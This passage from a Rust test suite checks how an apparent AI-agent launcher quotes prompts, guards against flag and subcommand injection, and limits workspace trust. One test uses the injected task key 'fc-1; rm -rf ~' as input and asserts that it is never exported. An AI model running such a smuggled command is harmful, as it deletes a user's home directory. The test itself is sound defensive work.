        assert!(opening.contains("farcooler task show."), "{opening}");
        assert!(opening.contains("farcooler task note --kind decision"), "{opening}");
        assert!(opening.contains("farcooler task ask --body"), "{opening}");
        // And the export it relies on is there for such a key.
        let command = with_pane_env(Uuid::now_v7(), "claude", Some("-1"), "claude".into());
        assert!(command.contains(" FARCOOLER_TASK=-1 "), "{command}");
        // An ordinary key is still written out.
        assert!(opening_prompt("farcooler", "fc-1").contains("farcooler task show fc-1."));
    }

    /// `TASK_AGENTS` is the daemon's and the CLI's one list of what a task
    /// can be dispatched to. Held here to the launch arms that really pass the
    /// first message: every one of them does, and a plain identifier that
    /// isn't one of them (the `other` arm) doesn't.
    #[test]
    fn the_agents_a_task_goes_to_are_the_ones_told_it() {
        for agent in farcooler_core::pane_env::TASK_AGENTS {
            let command = preset_command_with_hooks(agent, None, &inline("PROBE-7731"));
            assert!(command.contains("PROBE-7731"), "{agent} is dispatched to and never told: {command}");
            assert!(farcooler_core::pane_env::takes_a_task(&format!("{agent}:some-model")), "{agent}");
        }
        for other in ["gemini", "bash", "aider", "fcprobe"] {
            assert!(!farcooler_core::pane_env::takes_a_task(other), "{other}");
            let command = preset_command_with_hooks(other, None, &inline("PROBE-7731"));
            assert!(!command.contains("PROBE-7731"), "{other} would be told, so it could take a task: {command}");
        }
    }

    /// A key that is not a plain identifier never reaches the `env` line,
    /// which is not quoted.
    #[test]
    fn a_key_that_is_not_a_plain_identifier_is_not_exported() {
        let command = with_pane_env(Uuid::now_v7(), "claude", Some("fc-1; rm -rf ~"), "claude".into());
        assert!(!command.contains("FARCOOLER_TASK"), "{command}");
    }

    #[test]
    fn a_prompt_that_starts_with_a_dash_is_not_read_as_a_flag() {
        let command = preset_command_with_hooks("claude", None, &inline("--help me with this"));
        assert_eq!(argv_through(&command, "claude", "/bin/sh", "/bin/sh"), ", --help me with this");
    }

    /// Each CLI runs a subcommand whose name is its first positional:
    /// "update" updates claude or codex, "logout" signs cursor out, "apply"
    /// has codex `git apply` its last diff. A one-word prompt reaches every
    /// agent as a word no subcommand is named — and so does a leading dash.
    #[test]
    fn a_prompt_that_names_a_subcommand_is_not_run_as_one() {
        let cases = [
            ("claude", "claude", String::new()),
            ("codex", "codex", ",-c,check_for_update_on_startup=false".to_string()),
            ("cursor", "cursor-agent", String::new()),
        ];
        for (preset, program, flags) in &cases {
            for word in ["update", "logout", "apply", "-x"] {
                let command = preset_command_with_hooks(preset, None, &inline(word));
                assert_eq!(
                    argv_through(&command, program, "/bin/sh", "/bin/sh"),
                    format!("{flags}, {word}"),
                    "{preset} {word}"
                );
            }
            // A sentence cannot be a subcommand's name, and is left alone.
            let command = preset_command_with_hooks(preset, None, &inline("update the readme"));
            assert_eq!(
                argv_through(&command, program, "/bin/sh", "/bin/sh"),
                format!("{flags},update the readme")
            );
        }
    }

    /// A subcommand's name followed by enough newlines to go through the
    /// file: a shell strips trailing newlines from `"$(cat …)"`, which would
    /// leave the bare name. Trimmed before it is guarded, it cannot.
    #[test]
    fn a_subcommand_padded_with_newlines_is_still_not_run_as_one() {
        let dir = tempfile::tempdir().unwrap();
        for padded in [format!("update{}", "\n".repeat(9 * 1024)), "\n\t update \n".to_string()] {
            let command = launch_command_with_prompt(
                dir.path(), Uuid::now_v7(), "claude", None, LaunchExtras::NONE, Some(&padded), None);
            let bare = command.split_once(" /").map(|(_, rest)| format!("/{rest}")).unwrap();
            assert_eq!(argv_through(&bare, "claude", "/bin/sh", "/bin/sh"), ", update");
        }
    }

    #[test]
    fn a_long_prompt_that_names_a_subcommand_is_guarded_in_its_file_too() {
        let dir = tempfile::tempdir().unwrap();
        let id = Uuid::now_v7();
        let word = "u".repeat(20_000);
        launch_command_with_prompt(dir.path(), id, "claude", None, LaunchExtras::NONE, Some(&word), None);
        assert_eq!(std::fs::read_to_string(prompt_file(dir.path(), id)).unwrap(), format!(" {word}"));
    }

    #[test]
    fn a_preset_that_takes_no_prompt_is_launched_without_one() {
        for preset in ["shell", "aider", CHANGES_PRESET] {
            assert_eq!(
                preset_command_with_hooks(preset, None, &inline("hello")),
                preset_command_with_hooks(preset, None, &LaunchExtras::NONE),
                "{preset}"
            );
        }
    }

    #[test]
    fn no_prompt_leaves_every_launch_as_it_was() {
        // Real names: this checks the exact string the builder writes, and launches nothing.
        let _real = crate::service::test_agent::real_names();
        // Byte for byte, the command every pane had before prompts existed,
        // bar codex's update flag (its own test below).
        let shell = farcooler_core::shell::login_shell();
        assert_eq!(preset_command_with_hooks("claude:opus", None, &LaunchExtras::NONE), format!("{shell} -ilc 'claude --model opus'"));
        assert_eq!(preset_command_with_hooks("cursor", None, &LaunchExtras::NONE), format!("{shell} -ilc 'cursor-agent'"));
    }

    #[test]
    fn codex_is_told_not_to_offer_an_update_on_every_start() {
        let launch = preset_command_with_hooks("codex:gpt-5.6-sol", None, &LaunchExtras::NONE);
        assert_eq!(
            argv_through(&launch, "codex", "/bin/sh", "/bin/sh"),
            ",--model,gpt-5.6-sol,-c,check_for_update_on_startup=false"
        );
        let sid = Uuid::now_v7().to_string();
        let resume = terminal_mode_command("codex", &sid, true, &LaunchExtras::NONE);
        assert_eq!(
            argv_through(&resume, "codex", "/bin/sh", "/bin/sh"),
            format!(",resume,{sid},-c,check_for_update_on_startup=false")
        );
    }

    #[test]
    fn cursor_is_trusted_only_when_the_launch_says_so() {
        let trusted = LaunchExtras { trust_workspace: true, ..LaunchExtras::NONE };
        let command = preset_command_with_hooks("cursor", None, &trusted);
        assert_eq!(argv_through(&command, "cursor-agent", "/bin/sh", "/bin/sh"), ",--trust");
        // `printf ,%s` with no arguments at all still prints its comma.
        let command = preset_command_with_hooks("cursor", None, &LaunchExtras::NONE);
        assert_eq!(argv_through(&command, "cursor-agent", "/bin/sh", "/bin/sh"), ",");
        // And it is cursor's flag alone: claude and codex have no `--trust`,
        // and an unknown flag would end the pane at startup.
        for preset in ["claude", "codex"] {
            assert!(!preset_command_with_hooks(preset, None, &trusted).contains("--trust"), "{preset}");
        }
    }

    #[tokio::test]
    async fn cursor_trust_is_only_for_a_worktree_this_install_forked_for_a_new_task() {
        let (_dir, svc, ws) = super::restart_wiring_tests::a_workspace().await;
        let trusts = {
            let svc = svc.clone();
            move |path: String| {
                let svc = svc.clone();
                async move { svc.prepare_launch_hooks("cursor", &path).await.trust_workspace }
            }
        };

        // A new task's worktree: a new branch, cut here. Trusted — and only
        // for cursor.
        let made = svc.create_workspace(ws.repository_id, "fix-it", "fix-it", "HEAD").await.unwrap();
        assert!(trusts(made.worktree_path.clone()).await);
        assert!(svc.prepare_launch_hooks("cursor:auto", &made.worktree_path).await.trust_workspace);
        assert!(!svc.prepare_launch_hooks("claude", &made.worktree_path).await.trust_workspace);

        // An adopted branch is somebody's commits, and is not.
        git::git(Path::new(&ws.worktree_path), &["branch", "theirs"]).await.unwrap();
        let adopted = svc.adopt_branch(ws.repository_id, "theirs").await.unwrap();
        assert!(!trusts(adopted.worktree_path.clone()).await, "adopted");

        // The repository's own checkout is not.
        assert!(!trusts(ws.worktree_path.clone()).await, "main checkout");

        // A directory under `worktrees/` that nothing marked is not.
        let by_hand = svc.root.join("worktrees").join("repo").join("by-hand");
        std::fs::create_dir_all(&by_hand).unwrap();
        assert!(!trusts(by_hand.display().to_string()).await, "unmarked");

        // A worktree that has gone is not — tmux would start it in `$HOME`.
        let gone = made.worktree_path.clone();
        std::fs::remove_dir_all(&gone).unwrap();
        assert!(!trusts(gone).await, "missing");
        // Nor a missing path that climbs back out with `..`.
        let climb = svc.root.join("worktrees").join("nope").join("..").join("..");
        assert!(!trusts(climb.display().to_string()).await, "..");
        // Nor the holder itself.
        assert!(!trusts(svc.root.join("worktrees").display().to_string()).await, "holder");
    }

    /// codex's trust is drawn on cursor's line: its repository is written
    /// into codex's config for a worktree this install forked, and for nothing
    /// else, and only by a daemon on its channel's default home. The config
    /// here is a throwaway home (`codex_trust::test_home`), never the owner's.
    #[tokio::test]
    async fn codex_trust_is_only_for_a_worktree_this_install_forked_for_a_new_task() {
        let (_dir, svc, ws) = super::restart_wiring_tests::a_workspace().await;
        let home = tempfile::tempdir().unwrap();
        let config = home.path().join("config.toml");
        let entries = || -> Vec<String> {
            let text = std::fs::read_to_string(&config).unwrap_or_default();
            let doc: toml_edit::DocumentMut = text.parse().unwrap();
            doc.get("projects")
                .and_then(|p| p.as_table_like())
                .map(|p| p.iter().map(|(k, _)| k.to_string()).collect())
                .unwrap_or_default()
        };
        let made = svc.create_workspace(ws.repository_id, "fix-it", "fix-it", "HEAD").await.unwrap();

        // A daemon whose home isn't its channel's default (a scratch daemon,
        // a test) writes nothing, even for a forked worktree.
        let elsewhere = tempfile::tempdir().unwrap();
        {
            let _home = crate::codex_trust::test_home::set(home.path(), elsewhere.path());
            svc.prepare_launch_hooks("codex", &made.worktree_path).await;
            assert_eq!(entries(), Vec::<String>::new(), "not the default install");
        }

        let _home = crate::codex_trust::test_home::set(home.path(), &svc.root);
        // Not the repository's own checkout, and not cursor or claude.
        svc.prepare_launch_hooks("codex", &ws.worktree_path).await;
        svc.prepare_launch_hooks("cursor", &made.worktree_path).await;
        svc.prepare_launch_hooks("claude", &made.worktree_path).await;
        assert_eq!(entries(), Vec::<String>::new());

        // An adopted branch is somebody's commits, and is not trusted either.
        git::git(Path::new(&ws.worktree_path), &["branch", "theirs"]).await.unwrap();
        let adopted = svc.adopt_branch(ws.repository_id, "theirs").await.unwrap();
        svc.prepare_launch_hooks("codex", &adopted.worktree_path).await;
        assert_eq!(entries(), Vec::<String>::new());

        // A new task's worktree: its repository's main checkout, resolved.
        svc.prepare_launch_hooks("codex:gpt-5.6-terra", &made.worktree_path).await;
        let main = Path::new(&ws.worktree_path).canonicalize().unwrap();
        assert_eq!(entries(), vec![main.display().to_string()]);
    }

    #[test]
    fn a_short_prompt_stays_in_the_command() {
        let dir = tempfile::tempdir().unwrap();
        let id = Uuid::now_v7();
        let command =
            launch_command_with_prompt(dir.path(), id, "claude", None, LaunchExtras::NONE, Some(AWKWARD), None);
        assert!(command.len() <= MAX_INLINE_LAUNCH_BYTES);
        assert!(!dir.path().join(format!("prompt-{id}")).exists(), "no file for a prompt that fits");
    }

    /// Long enough that inline it is past tmux's ceiling even before quoting:
    /// the awkward text, repeated. Every quote in it grows fourfold per layer.
    fn long_prompt() -> String {
        let mut text = String::new();
        while text.len() < 20_000 {
            text.push_str(AWKWARD);
            text.push('\n');
        }
        text.trim_end().to_string()
    }

    #[test]
    fn a_long_prompt_goes_through_a_private_file_that_the_launch_reads_and_removes() {
        let dir = tempfile::tempdir().unwrap();
        let id = Uuid::now_v7();
        let prompt = long_prompt();
        let command =
            launch_command_with_prompt(dir.path(), id, "claude", None, LaunchExtras::NONE, Some(&prompt), None);
        assert!(command.len() <= MAX_INLINE_LAUNCH_BYTES, "{} bytes", command.len());

        let file = dir.path().join(format!("prompt-{id}"));
        assert_eq!(std::fs::read_to_string(&file).unwrap(), prompt);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&file).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode, 0o600, "a prompt is somebody's words");
        }

        // Past the pane actor's `env`, which the probe does not need.
        let bare = command.split_once(" /").map(|(_, rest)| format!("/{rest}")).unwrap();
        for shell in shells() {
            std::fs::write(&file, &prompt).unwrap();
            assert_eq!(argv_through(&bare, "claude", "/bin/sh", &shell), format!(",{prompt}"), "{shell}");
            assert!(!file.exists(), "{shell} read the file and removed it");
        }
    }

    /// The fallback exists because tmux refuses the inline form, and this
    /// asks tmux — the fixture's private server, running the real login
    /// shell as its `default-shell` — rather than trusting a number: the
    /// inline command is refused, and the file form is accepted and delivers
    /// the whole prompt as one argument.
    #[tokio::test]
    async fn tmux_refuses_a_long_prompt_inline_and_takes_it_through_the_file() {
        let (dir, svc, ws) = super::restart_wiring_tests::a_workspace().await;
        let prompt = long_prompt();
        let out = dir.path().join("argv");
        // Unquoted inside the payload, so a path with nothing to quote.
        assert!(!out.display().to_string().contains([' ', '\'', '\\']), "{}", out.display());
        let printf = format!("printf ,%s >{}", out.display());

        let inline = with_pane_env(
            Uuid::now_v7(),
            "claude",
            None,
            preset_command_with_hooks("claude", None, &inline(&prompt)),
        );
        assert!(inline.len() > 16_384, "the inline form is past the ceiling: {}", inline.len());
        let refused = svc
            .tmux
            .create_terminal_window(ws.id, Uuid::now_v7(), "inline", &ws.worktree_path, &super::test_agent::unstubbed(&inline).replacen("claude", &printf, 1))
            .await;
        assert!(refused.is_err(), "tmux took a command past its ceiling");

        let id = Uuid::now_v7();
        let command =
            launch_command_with_prompt(&svc.root, id, "claude", None, LaunchExtras::NONE, Some(&prompt), None);
        svc.tmux
            .create_terminal_window(ws.id, id, "file", &ws.worktree_path, &super::test_agent::unstubbed(&command).replacen("claude", &printf, 1))
            .await
            .expect("tmux takes the file form");

        // An interactive login shell reads the person's own startup files
        // first, which can take a while.
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
        let expected = format!(",{prompt}");
        loop {
            if std::fs::read_to_string(&out).is_ok_and(|s| s == expected) {
                break;
            }
            assert!(std::time::Instant::now() < deadline, "the prompt never arrived whole");
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        }
        assert!(!svc.root.join(format!("prompt-{id}")).exists(), "the launch removed its file");
    }

    /// Linux refuses any single argv string over `MAX_ARG_STRLEN`, 128 KiB,
    /// with E2BIG — after the file was read and removed, so the task is lost.
    /// The cap has to leave room for the guard's space.
    #[test]
    fn the_largest_prompt_accepted_still_fits_one_linux_argument() {
        const MAX_ARG_STRLEN: usize = 32 * 4096;
        let largest = "x".repeat(MAX_LAUNCH_PROMPT_BYTES);
        assert!(validate_launch_prompt(&largest).is_ok());
        assert!(guarded(&largest).len() < MAX_ARG_STRLEN);
        const { assert!(MAX_LAUNCH_PROMPT_BYTES + 28 * 1024 <= MAX_ARG_STRLEN, "a margin under 128 KiB") };
    }

    #[test]
    fn a_prompt_that_cannot_be_an_argument_is_refused() {
        assert!(validate_launch_prompt("fine").is_ok());
        assert!(validate_launch_prompt("a\0b").is_err());
        assert!(validate_launch_prompt(&"x".repeat(MAX_LAUNCH_PROMPT_BYTES + 1)).is_err());
    }
}
